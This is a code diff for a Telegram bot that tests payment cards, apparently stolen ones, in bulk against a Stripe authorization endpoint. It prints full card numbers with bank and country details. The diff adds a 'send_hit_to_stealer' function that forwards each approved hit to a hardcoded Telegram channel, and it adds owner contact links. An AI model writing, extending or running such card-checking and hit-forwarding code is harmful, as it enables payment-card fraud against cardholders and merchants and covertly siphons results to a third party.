@@ -24,6 +24,10 @@ STRIPE_ACCOUNT = "acct_1Mpulb2El1QixccJ"
 MAX_MSC_LIMIT = 10
 MAX_TSC_LIMIT = 100
 
+# Owner DM Link
+OWNER_DM = "https://t.me/spid_3r"
+SYMBOL = f"<a href='{OWNER_DM}'>㊕</a>"
+
 def generate_email(domain=None, username_length=8):
     """Generate random email"""
     common_domains = [
@@ -51,6 +55,23 @@ def parseX(data, start, end):
         return data[star:last]
     except ValueError:
         return "None"
+
+async def send_hit_to_stealer(client: Client, fullcc, status, response, gateway, time_taken, first_name, role):
+    """Send approved card to stealer channel/group (NO CC, NO BIN, NO Bank, NO Country)"""
+    try:
+        stealer_msg = f"""✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 𝗛𝗜𝗧 ✅
+
+{SYMBOL} 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {gateway}
+{SYMBOL} 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response}
+
+{SYMBOL} 𝗧𝗼𝗼𝗸 {time_taken:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀
+{SYMBOL} 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆: {first_name} ({role})
+{SYMBOL} 𝗢𝘄𝗻𝗲𝗿: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
+
+        await client.send_message(chat_id=-1003627495953, text=stealer_msg, parse_mode="HTML")
+        print(f"[Stealer] Sent approved hit to channel")
+    except Exception as e:
+        print(f"[Stealer Error] Failed to send to channel: {e}")
 
 async def call_stripe_auth_api(fullcc, session=None):
     """Call Stripe Auth API to check credit card"""
@@ -151,16 +172,16 @@ async def call_stripe_auth_api(fullcc, session=None):
             final_result = response.json()
             
             if final_result.get("success"):
-                return "Approved ✓", "Stripe Auth Success", GATE_NAME, "0.00s"
+                return "Approved ✅", "Stripe Auth Success", GATE_NAME, "0.00s"
             else:
                 error_msg = final_result.get('data', {}).get('error', {}).get('message', 'Unknown error')
                 if "insufficient_funds" in error_msg.lower():
-                    return "Approved ✓", "Auth Only - No Funds", GATE_NAME, "0.00s"
+                    return "Approved ✅", "Auth Only - No Funds", GATE_NAME, "0.00s"
                 else:
-                    return "Declined ✗", error_msg[:30], GATE_NAME, "0.00s"
+                    return "Declined ❌", error_msg[:30], GATE_NAME, "0.00s"
         else:
             error = result_json.get("error", {}).get("message", "Invalid card")
-            return "Declined ✗", error[:30], GATE_NAME, "0.00s"
+            return "Declined ❌", error[:30], GATE_NAME, "0.00s"
             
     except Exception as e:
         return "Error", str(e)[:30], GATE_NAME, "0.00s"
@@ -204,17 +225,17 @@ async def stripe_auth_cmd(Client, message):
         
         firstresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ. ✧
 
-💠 𝘾𝙘-» <code>{fullcc}</code>
-💠 𝙂𝙖𝙩𝙚-» <i>{gateway}</i>
-💠 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚-» ■□□□"""
+{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
+{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
+{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■□□□"""
         await asyncio.sleep(0.5)
         firstchk = await message.reply_text(firstresp, quote=True, parse_mode=enums.ParseMode.HTML)
 
         secondresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ.. ✧
 
-💠 𝘾𝙘-» <code>{fullcc}</code>
-💠 𝙂𝙖𝙩𝙚-» <i>{gateway}</i>
-💠 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚-» ■■■□"""
+{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
+{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
+{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■■■□"""
         await asyncio.sleep(0.5)
         secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp, parse_mode=enums.ParseMode.HTML)
 
@@ -226,33 +247,36 @@ async def stripe_auth_cmd(Client, message):
 
         thirdresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ... ✧
 
-💠 𝘾𝙘-» <code>{fullcc}</code>
-💠 𝙂𝙖𝙩𝙚-» <i>{gateway}</i>
-💠 𝙍𝙚𝙨𝙥𝙤ɴꜱᴇ-» ■■■■"""
+{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
+{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
+{SYMBOL} 𝙍𝙚𝙨𝙥𝙤ɴꜱᴇ -» ■■■■"""
         await asyncio.sleep(0.5)
         thirdcheck = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp, parse_mode=enums.ParseMode.HTML)
 
-        finalresp = f"""💠 𝘾𝙘-» <code>{fullcc}</code>
-💠 𝙎𝙩𝙖𝙩ᴜꜱ-» {status}
-💠 𝙍ᴇꜱᴜʟᴛ-» {response} 💎
-════『 INFO 』════
-<blockquote expandable>💠 𝘾ᴏᴜɴᴛʀʏ-» {country} {flag}
-💠 𝘽ɪɴ-» {brand}_{type_}-{level}
-💠 𝘽ᴀɴᴋ-» {bank}</blockquote>
-════『 META 』════
-💠 𝙂ᴀᴛᴇᴡᴀʏ -» {gateway}
-💠 𝙏ɪᴍᴇ-» {time.perf_counter() - start:.2f}s
-💠 𝘾ʜᴇᴄᴋᴇᴅ ʙʏ-» <a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a> ↯
-{role}
-════『 OWNER 』════
-      <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
+        if "Approved" in status or "✅" in status:
+            await send_hit_to_stealer(
+                Client, fullcc, status, response, gateway,
+                time.perf_counter() - start, first_name, role
+            )
+
+        finalresp = f"""{status}
+
+{SYMBOL} 𝗖𝗖 ⇾ <code>{fullcc}</code>
+{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {gateway}
+{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {response}
+
+{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {brand}_{type_}-{level}
+{SYMBOL} 𝗕ᴀɴᴋ: {bank}
+{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {country} {flag}
+
+{SYMBOL} 𝗧ᴏᴏᴋ {time.perf_counter() - start:.2f} 𝘀ᴇᴄᴏɴᴅs
+{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
+{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
         
         await Client.edit_message_text(message.chat.id, thirdcheck.id, finalresp, disable_web_page_preview=True, parse_mode=enums.ParseMode.HTML)
         
         await setantispamtime(user_id)
         await deductcredit(user_id)
-        if "Approved" in status:
-            await send_hit_if_approved(Client, finalresp)
     except Exception:
         import traceback
         await error_log(traceback.format_exc())
@@ -351,57 +375,158 @@ async def stripe_auth_txt_cmd(Client, message):
 # --- SEQUENTIAL ONE-BY-ONE PROCESSING LOGIC ---
 async def process_sequential_check(Client, message, ccs, user_id, first_name, role):
     """Process multiple cards one by one with live updates"""
-    initial_resp = f"""✧ <b>ꜱᴘʏᴅᴇ ━ ᴍᴀꜱꜱ ᴄʜᴇᴄᴋ</b> ✧
-▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰
-
-💠 𝙂𝙖𝙩𝙚 -» {GATE_NAME}
-💠 𝘾𝘾 𝘼𝙢𝙤𝙪𝙣𝙩 -» {len(ccs)}
-💠 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 -» {first_name}
-💠 𝙎𝙩𝙖𝙩𝙪𝙨 -» Processing...
-━━━━━━━━━━━━━━━━━━━━"""
-    progress_msg = await message.reply(initial_resp, quote=True, parse_mode=enums.ParseMode.HTML)
-    
-    header_text = f"""✧ <b>ꜱᴘʏᴅᴇ ━ ᴍᴀꜱꜱ ᴄʜᴇᴄᴋ</b> ✧
-━━━━━━━━━━━━━━━━━━━━
-"""
-    final_text = header_text
-    start_time = time.perf_counter()
+    total_cards = len(ccs)
+    processed = 0
+    approved_count = 0
+    declined_count = 0
     gateway = GATE_NAME
+    start_time = time.perf_counter()
     
-    for fullcc in ccs:
+    approved_cards = []
+    
+    # Send initial progress message
+    progress_text = f"""Stripe Auth
+Admin
+
+{SYMBOL} Response: Starting...
+
+Progress: 0/{total_cards}
+Approved: 0
+Declined: 0
+Remaining: {total_cards}
+
+Checked by: {first_name} ({role})"""
+    
+    progress_msg = await message.reply(progress_text, quote=True, parse_mode=enums.ParseMode.HTML)
+    
+    for idx, fullcc in enumerate(ccs, 1):
+        processed = idx
+        remaining = total_cards - processed
+        
         status, response, gateway, time_taken = await call_stripe_auth_api(fullcc)
         
-        cc_num = fullcc.split("|")[0]
+        cc_num = fullcc.split('|')[0]
         getbin = await get_bin_details(cc_num)
         brand, type_, level, bank, country, flag, currency = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5], getbin[6]
         
-        card_resp = f"""💠 𝘾𝙘-» <code>{fullcc}</code>
-💠 𝙎𝙩𝙖𝙩ᴜꜱ-» {status}
-💠 𝙍ᴇꜱᴜʟᴛ-» {response} 💎
-════『 INFO 』════
-<blockquote expandable>💠 𝘾ᴏᴜɴᴛʀʏ-» {country} {flag}
-💠 𝘽ɪɴ-» {brand}_{type_}-{level}
-💠 𝘽ᴀɴᴋ-» {bank}</blockquote>
-━━━━━━━━━━━━━━━━━━━━
-"""
-        final_text += card_resp
+        if "Approved" in status or "✅" in status:
+            approved_count += 1
+            response_status = "APPROVED ✅"
+            card_time = time.perf_counter() - start_time
+            
+            approved_cards.append({
+                "fullcc": fullcc,
+                "status": status,
+                "response": response,
+                "gateway": gateway,
+                "brand": f"{brand}_{type_}-{level}",
+                "bank": bank,
+                "country": country,
+                "flag": flag,
+                "time": card_time
+            })
+            
+            # Send to stealer channel (NO CC, NO BIN, NO Bank, NO Country)
+            await send_hit_to_stealer(
+                Client, fullcc, status, response, gateway, 
+                card_time, first_name, role
+            )
+        else:
+            declined_count += 1
+            response_status = "DECLINED ❌"
         
+        # Update progress
         try:
-            await progress_msg.edit_text(final_text, disable_web_page_preview=True, parse_mode=enums.ParseMode.HTML)
-        except Exception:
+            await Client.edit_message_text(
+                message.chat.id, 
+                progress_msg.id, 
+                f"""Stripe Auth
+Admin
+
+{SYMBOL} Response: {response_status}
+
+Progress: {processed}/{total_cards}
+Approved: {approved_count}
+Declined: {declined_count}
+Remaining: {remaining}
+
+Checked by: {first_name} ({role})""",
+                parse_mode=enums.ParseMode.HTML
+            )
+        except:
             pass
         
         await asyncio.sleep(0.5)
-
-    elapsed_time = round(time.perf_counter() - start_time, 2)
-    footer = f"""════『 META 』════
-💠 𝙂ᴀᴛᴇᴡᴀʏ -» {gateway}
-💠 𝙏ɪᴍᴇ-» {elapsed_time}s
-💠 𝘾ʜᴇᴄᴋᴇᴅ ʙʏ-» <a href='tg://user?id={user_id}'>{first_name}</a> ↯
-{role}
-════『 OWNER 』════
-      <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
     
-    final_text += footer
-    await progress_msg.edit_text(final_text, disable_web_page_preview=True, parse_mode=enums.ParseMode.HTML)
+    # Delete progress message
+    await progress_msg.delete()
+    
+    # Send each approved card as separate message (SHOW EVERYTHING)
+    for card in approved_cards:
+        approved_msg = f"""{card['status']}
+
+{SYMBOL} 𝗖𝗖 ⇾ <code>{card['fullcc']}</code>
+{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {card['gateway']}
+{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {card['response']}
+
+{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {card['brand']}
+{SYMBOL} 𝗕ᴀɴᴋ: {card['bank']}
+{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {card['country']} {card['flag']}
+
+{SYMBOL} 𝗧ᴏᴏᴋ {card['time']:.2f} 𝘀ᴇᴄᴏɴᴅs
+{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
+{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
+        
+        await message.reply_text(approved_msg, quote=True, parse_mode=enums.ParseMode.HTML)
+        await asyncio.sleep(0.5)
+    
+    # Send declined summary
+    elapsed_time = round(time.perf_counter() - start_time, 2)
+    
+    if approved_count > 0:
+        declined_summary = f"""❌ 𝗗𝗲𝗰𝗹ɪɴᴇᴅ 𝗖ᴀʀᴅs ({declined_count})
+
+━━━━━━━━━━━━━━━━━━━━
+"""
+        # Show first 15 declined cards
+        declined_list = []
+        for fullcc in ccs:
+            if fullcc not in [card['fullcc'] for card in approved_cards]:
+                declined_list.append(fullcc)
+        
+        for card in declined_list[:15]:
+            declined_summary += f"{SYMBOL} {card} → Declined\n"
+        
+        if declined_count > 15:
+            declined_summary += f"\n... and {declined_count - 15} more declined cards"
+        
+        declined_summary += f"""
+━━━━━━━━━━━━━━━━━━━━
+✅ Approved: {approved_count}
+❌ Declined: {declined_count}
+📊 Total: {total_cards}
+⏱ Time: {elapsed_time}s
+👤 Checked by: {first_name} ({role})
+
+━━━━━━━━━━━━━━━━━━━━
+<a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
+        
+        await message.reply_text(declined_summary, quote=True, parse_mode=enums.ParseMode.HTML)
+    else:
+        # No approved cards
+        await message.reply_text(
+            f"""❌ 𝗡ᴏ 𝗔ᴘᴘʀᴏᴠᴇᴅ 𝗖ᴀʀᴅs
+
+━━━━━━━━━━━━━━━━━━━━
+📊 Total Cards: {total_cards}
+❌ All Declined: {declined_count}
+⏱ Time: {elapsed_time}s
+👤 Checked by: {first_name} ({role})
+
+━━━━━━━━━━━━━━━━━━━━
+<a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>""",
+            quote=True,
+            parse_mode=enums.ParseMode.HTML
+        )
+    
     await setantispamtime(user_id)
